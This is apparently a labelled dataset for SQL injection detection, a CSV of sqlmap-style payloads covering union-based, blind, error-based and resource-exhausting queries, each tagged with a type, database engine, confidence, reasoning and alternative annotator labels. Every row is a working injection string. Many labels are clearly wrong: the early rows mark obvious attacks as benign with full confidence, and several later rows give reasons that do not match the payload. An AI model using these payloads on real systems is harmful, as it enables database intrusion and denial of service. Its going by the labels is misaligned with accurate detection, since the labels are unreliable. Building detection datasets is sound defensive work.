payload_norm,sqli_type,db_engine,confidence,reasoning,verdict,critique_reasons,suggested_type,suggested_db,id,a_type,a_db,a_signals,c_type,c_db,c_signals,payload_inner
-6712' ) ) as kqff where 9146 = 9146 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2210,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,-6712' ) ) as kqff where 9146 = 9146 or 5903 = ( 'qqpjq'|| ( select case 5903 when 5903 then 1 else 0 end from rdb$database ) ||'qzvzq' ) --
"-7812' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'ttvo' = 'ttvo",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2211,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-7812' ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( 'ttvo' = 'ttvo"
-7279 ) or 9898 = 9963 and ( 1481 = 1481,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2212,boolean_blind,generic,Pattern match: 'or 9898 = 9963' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",-7279 ) or 9898 = 9963 and ( 1481 = 1481
-8523 ) as hzqs where 8944 = 8944 order by 1--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2213,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,-8523 ) as hzqs where 8944 = 8944 order by 1--
"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wynp",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2214,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1 and 4241 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 4241 = 4241 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) -- wynp"
"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""zzmn"" = ""zzmn",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2215,boolean_blind,firebird,generic SQL keywords without specific signal,boolean_blind,firebird,generic SQL structure without strong signal,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 and ( ( ""zzmn"" = ""zzmn"
"1"" ) where 9570 = 9570 rlike ( select ( case when ( 1642 = 3686 ) then 1 else 0x28 end ) ) --",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2216,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) where 9570 = 9570 rlike ( select ( case when ( 1642 = 3686 ) then 1 else 0x28 end ) ) --"
"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""urgd"" = ""urgd",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2217,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"1"" ) ) ) and 6055 = ctxsys.drithsx.sn ( 6055, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 6055 = 6055 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ( ""urgd"" = ""urgd"
1' ) as mwpp where 6192 = 6192,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2218,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as mwpp where 6192 = 6192
"-8988"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""dyxh"" like ""dyxh",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2219,error_based,oracle,Pattern match: 'ctxsys.drithsx' → error_based (P4); DB signature: oracle,error_based,oracle,error function 'ctxsys.drithsx' detected,"-8988"" ) ) or 5023 = ctxsys.drithsx.sn ( 5023, ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 5023 = 5023 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ( ""dyxh"" like ""dyxh"
"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'cdgm' like 'cdgm",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2220,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1' and ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 3484 = 3484,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and 'cdgm' like 'cdgm"
if ( 1928 = 4811 ) select 1928 else drop function ucko--,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2221,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,if ( 1928 = 4811 ) select 1928 else drop function ucko--
1' ) as pudv where 2609 = 2609,benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2222,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,1' ) as pudv where 2609 = 2609
"-8698"" where 1990 = 1990 or ( 8459 = 8459 ) *4906--",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2223,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-8698"" where 1990 = 1990 or ( 8459 = 8459 ) *4906--"
"1%' and elt ( 7619 = 1489,1489 ) and '%' = '",benign,generic,1.0,Normal SELECT/INSERT/UPDATE/DELETE query,KEEP,,benign,generic,2224,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1%' and elt ( 7619 = 1489,1489 ) and '%' = '"
"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #",error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,2225,error_based,oracle,Pattern match: 'extractvalue (' → error_based (P4); DB signature: oracle,heavy_query,oracle,contains 7+ digit number (DoS-style payload),"1'|| ( select 'epjr' from dual where 3074 = 3074 procedure analyse ( extractvalue ( 9627,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x4b774c75 ) ) ) ) ) ,1 ) #"
1'+ ( select zpdf where 2938 = 2938,boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2226,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select zpdf where 2938 = 2938
1'+ ( select gthp where 7311 = 7311 or sleep ( 5 ) #,time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2227,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,1'+ ( select gthp where 7311 = 7311 or sleep ( 5 ) #
"-3278' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'zxig' like 'zxig",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2228,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"-3278' ) ) or elt ( 1032 = 1032,3623 ) and ( ( 'zxig' like 'zxig"
"1"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2229,time_blind,sqlite,Pattern match: 'randomblob (' → time_blind (P5); DB signature: sqlite,heavy_query,sqlite,contains 7+ digit number (DoS-style payload),"1"" or 6979 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --"
"1"" ) ) as dksq where 7161 = 7161",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2230,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) ) as dksq where 7161 = 7161"
"-6279' ) union all select 3026,3026,3026,3026,3026,3026,3026,3026--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2231,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-6279' ) union all select 3026,3026,3026,3026,3026,3026,3026,3026--"
"-9566%"" ) union all select 7973,7973,7973,7973--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2232,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-9566%"" ) union all select 7973,7973,7973,7973--"
"1 ) ) and elt ( 9288 = 6067,6067 ) and ( ( 1895 = 1895",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2233,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1 ) ) and elt ( 9288 = 6067,6067 ) and ( ( 1895 = 1895"
"1'|| ( select 'xpjg' where 3036 = 3036 and elt ( 1832 = 6644,6644 ) ) ||'",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2234,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1'|| ( select 'xpjg' where 3036 = 3036 and elt ( 1832 = 6644,6644 ) ) ||'"
"1 ) ) as debc where 7428 = 7428 union all select null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2235,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1 ) ) as debc where 7428 = 7428 union all select null,null,null#"
"1 and make_set ( 8403 = 8403,8899 )",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2236,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"1 and make_set ( 8403 = 8403,8899 )"
"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm",heavy_query,sqlite,0.9,randomblob for heavy query,KEEP,,heavy_query,sqlite,2237,benign,generic,no attack signal detected,heavy_query,generic,contains 7+ digit number (DoS-style payload),"call regexp_substring ( repeat ( left ( crypt_key ( char ( 65 ) ||char ( 69 ) ||char ( 83 ) ,null ) ,0 ) ,500000000 ) ,null ) # cdjm"
select pg_sleep ( 5 ) and 'zfyy' = 'zfyy,time_blind,postgresql,0.9,pg_sleep for PostgreSQL time blind,KEEP,,time_blind,postgresql,2238,time_blind,postgresql,Pattern match: 'pg_sleep (' → time_blind (P5); DB signature: postgresql,boolean_blind,postgresql,generic SQL structure without strong signal,select pg_sleep ( 5 ) and 'zfyy' = 'zfyy
"-2549' ) as zfnf where 1993 = 1993 union all select 1993,1993,1993,1993,1993,1993--",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2239,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2549' ) as zfnf where 1993 = 1993 union all select 1993,1993,1993,1993,1993,1993--"
1 and 9412 = 6877#,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2240,boolean_blind,generic,Pattern match: 'and 9412 = 6877' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 and 9412 = 6877#
"-4541"" ) ) or make_set ( 4821 = 5233,5233 ) and ( ( ""xfex"" = ""xfex",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2241,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,"-4541"" ) ) or make_set ( 4821 = 5233,5233 ) and ( ( ""xfex"" = ""xfex"
"1%' ) ) ) union all select null,null,null,null,null,null#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2242,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1%' ) ) ) union all select null,null,null,null,null,null#"
"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""vhey"" = ""vhey",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2243,heavy_query,postgresql,"Pattern match: 'generate_series ( 1,5000000 )' → heavy_query (P4); DB signature: postgresql",heavy_query,postgresql,contains 7+ digit number (DoS-style payload),"1"" ) ) or 8421 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( ( ""vhey"" = ""vhey"
1 ) and 8417 = 5276#,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2244,boolean_blind,generic,Pattern match: 'and 8417 = 5276' → boolean_blind (P3); DB signature: generic,boolean_blind,generic,"boolean condition (1=1, RLIKE, or ELT)",1 ) and 8417 = 5276#
"-2140 ) ) union all select 8174,8174,8174#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2245,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2140 ) ) union all select 8174,8174,8174#"
"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""%"" = """,error_based,mysql,0.85,extractvalue for error extraction,KEEP,,error_based,mysql,2246,error_based,mysql,Pattern match: 'extractvalue (' → error_based (P4); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1%"" procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 ) and ""%"" = """
"-2167' ) ) ) union all select 3804,3804,3804,3804,3804,3804#",union_based,generic,0.85,UNION ALL for union-based,KEEP,,union_based,generic,2247,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-2167' ) ) ) union all select 3804,3804,3804,3804,3804,3804#"
1 ) as rlft where 1670 = 1670 waitfor delay '0:0:5'--,time_blind,mssql,0.9,waitfor delay MSSQL time blind,KEEP,,time_blind,mssql,2248,time_blind,mssql,Pattern match: 'waitfor delay' → time_blind (P5); DB signature: mssql,time_blind,mssql,time function 'waitfor delay' detected,1 ) as rlft where 1670 = 1670 waitfor delay '0:0:5'--
"-6406%' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '",boolean_blind,mssql,0.8,CONVERT INT for blind,KEEP,,boolean_blind,mssql,2249,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"-6406%' ) or 1570 = convert ( int, ( select char ( 113 ) +char ( 113 ) +char ( 112 ) +char ( 106 ) +char ( 113 ) + ( select ( case when ( 1570 = 1570 ) then char ( 49 ) else char ( 48 ) end ) ) +char ( 113 ) +char ( 122 ) +char ( 118 ) +char ( 122 ) +char ( 113 ) ) ) and ( '%' = '"
-9311 ) ) or ( 5065 = 2572 ) *2572 and ( ( 1199 = 1199,boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2250,boolean_blind,generic,generic SQL keywords without specific signal,benign,generic,no SQLi signal in heuristic check,-9311 ) ) or ( 5065 = 2572 ) *2572 and ( ( 1199 = 1199
"1"" ) as tnux where 4888 = 4888 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2251,boolean_blind,mysql,Pattern match: 'rlike (' → boolean_blind (P3); DB signature: mysql,boolean_blind,mysql,"boolean condition (1=1, RLIKE, or ELT)","1"" ) as tnux where 4888 = 4888 rlike ( select * from ( select ( sleep ( 5 ) ) ) vwyq ) #"
"1' ) ) and elt ( 6847 = 5874,5874 ) and ( ( 'yspu' = 'yspu",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2252,boolean_blind,mysql,Pattern match: 'elt (' → boolean_blind (P3); DB signature: mysql,benign,generic,no SQLi signal in heuristic check,"1' ) ) and elt ( 6847 = 5874,5874 ) and ( ( 'yspu' = 'yspu"
"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2253,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"-7746' ) union all select 1998,1998,1998,1998,1998,1998,1998,1998#"
"1"" where 2677 = 2677 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --",boolean_blind,mysql,0.8,make_set() for boolean blind,KEEP,,boolean_blind,mysql,2254,time_blind,mysql,Pattern match: 'sleep (' → time_blind (P5); DB signature: mysql,boolean_blind,mysql,generic SQL structure without strong signal,"1"" where 2677 = 2677 and ( select * from ( select ( sleep ( 5 ) ) ) fzno ) --"
"1'|| ( select 'odud' from dual where 2468 = 2468 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",boolean_blind,generic,0.8,AND equality for blind,KEEP,,boolean_blind,generic,2255,boolean_blind,oracle,generic SQL keywords without specific signal,boolean_blind,oracle,generic SQL structure without strong signal,"1'|| ( select 'odud' from dual where 2468 = 2468 or 2367 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --"
"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--",boolean_blind,generic,0.8,WHERE equality for blind,KEEP,,boolean_blind,generic,2256,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1'+ ( select kpso where 1226 = 1226 union all select null,null,null,null,null,null,null,null--"
"1"" ) as lvbm where 8179 = 8179",time_blind,generic,0.9,sleep() for time blind,KEEP,,time_blind,generic,2257,benign,generic,no attack signal detected,boolean_blind,generic,generic SQL structure without strong signal,"1"" ) as lvbm where 8179 = 8179"
-7231 ) ) union all select 7639#,heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2258,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,-7231 ) ) union all select 7639#
"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) -- rlas",heavy_query,postgresql,0.9,generate_series for heavy query,KEEP,,heavy_query,postgresql,2259,time_blind,mysql,Pattern match: 'benchmark (' → time_blind (P5); DB signature: mysql,heavy_query,mysql,contains 7+ digit number (DoS-style payload),"1 or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) -- rlas"
1'+ ( select 'gtqr' where 5660 = 5660,boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2260,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,1'+ ( select 'gtqr' where 5660 = 5660
"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",boolean_blind,mysql,0.8,ELT IF for boolean blind,KEEP,,boolean_blind,mysql,2261,boolean_blind,generic,generic SQL keywords without specific signal,boolean_blind,generic,generic SQL structure without strong signal,"1%"" ) ) and 9660 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --"
"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--",boolean_blind,mysql,0.8,elt() for boolean blind,KEEP,,boolean_blind,mysql,2262,union_based,generic,Pattern match: 'union all select' → union_based (P7); DB signature: generic,union_based,generic,UNION SELECT structure,"1' ) ) as kdwc where 5906 = 5906 union all select null,null,null,null,null,null,null,null,null--"
